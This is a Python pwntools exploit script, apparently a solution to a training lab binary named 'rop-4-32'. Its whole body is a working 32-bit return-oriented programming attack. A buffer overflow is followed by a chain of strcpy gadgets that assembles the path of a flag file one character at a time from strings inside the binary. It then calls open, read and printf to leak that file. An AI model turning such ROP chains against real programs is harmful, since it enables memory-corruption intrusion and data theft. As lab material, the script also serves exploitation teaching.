#!/usr/bin/env python

from pwn import *

p = process('./rop-4-32')

buf = "A" * 0x8c

"""
0x080483c0  read@plt
0x080483d0  printf@plt
0x080483e0  chdir@plt
0x080483f0  puts@plt
0x08048400  open@plt
0x0804858e  strcpy
"""

strcpy = p32(0x0804858e)
openAddr = p32(0x08048400)
read = p32(0x080483c0)
printf = p32(0x080483d0)

"""
0x080483a9 : pop ebx ; ret
0x0804873a : pop edi ; pop ebp ; ret
0x08048739 : pop esi ; pop edi ; pop ebp ; ret
"""

pop_ebx = p32(0x080483a9)
pop_edi_ebp = p32(0x0804873a)
pop_esi_edi_ebp = p32(0x08048739)

memory = 0x804a800
flag = 0x804a900
"""
0x8048768:  |    the quick brown  |     fox jumps over t |     he lazy dog!
            | 0  0123456789abcdef | 10  0123456789abcdef | 20  0123456789ab

0x8048798:  |    I also put this  |     for you: 1234567 |     89-
            | 0  0123456789abcdef | 10  0123456789abcdef | 20  012

0x80487e0: "/"

strcpy(dest, src, size)
"""

fox = 0x8048768
special = 0x8048798
slash = 0x80487e0

def builder (destItr, src, srcItr):
    string = strcpy
    string += pop_edi_ebp
    string += p32(memory + destItr)
    string += p32(src + srcItr)
    return string

buf += builder(0, slash, 0)         # /
buf += builder(1, fox, 1)           # h
buf += builder(2, fox, 0xc)         # o
buf += builder(3, fox, 0x16)        # m
buf += builder(4, fox, 2)           # e
buf += builder(5, slash, 0)         # /
buf += builder(6, fox, 0x23)        # l
buf += builder(7, fox, 0x24)        # a
buf += builder(8, fox, 0xa)         # b
buf += builder(9, fox, 0x18)        # s
buf += builder(10, slash, 0)        # /
buf += builder(11, fox, 0xd)        # w
buf += builder(12, fox, 2)          # e
buf += builder(13, fox, 2)          # e
buf += builder(14, fox, 8)          # k
buf += builder(15, special, 0x1d)   # 5
buf += builder(16, slash, 0)        # /
buf += builder(17, fox, 0xb)        # r
buf += builder(18, fox, 0xc)        # o
buf += builder(19, fox, 0x17)       # p
buf += builder(20, special, 0x23)   # -
buf += builder(21, special, 0x1c)   # 4
buf += builder(22, special, 0x23)   # -
buf += builder(23, special, 0x1b)   # 3
buf += builder(24, special, 0x1a)   # 2
buf += builder(25, slash, 0)        # /
buf += builder(26, fox, 0x10)       # f
buf += builder(27, fox, 0x23)       # l
buf += builder(28, fox, 0x24)       # a
buf += builder(29, fox, 0x2a)       # g
buf += builder(30, slash, 1)        # \0

# open
buf += openAddr
buf += pop_esi_edi_ebp
buf += p32(memory)
buf += p32(0)
buf += p32(0)

# read
buf += read
buf += pop_esi_edi_ebp
buf += p32(3)
buf += p32(flag)
buf += p32(0x100)

# printf
buf += printf
buf += "AAAA"
buf += p32(flag)

with open("buf.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)
print(p.recv())
p.interactive()
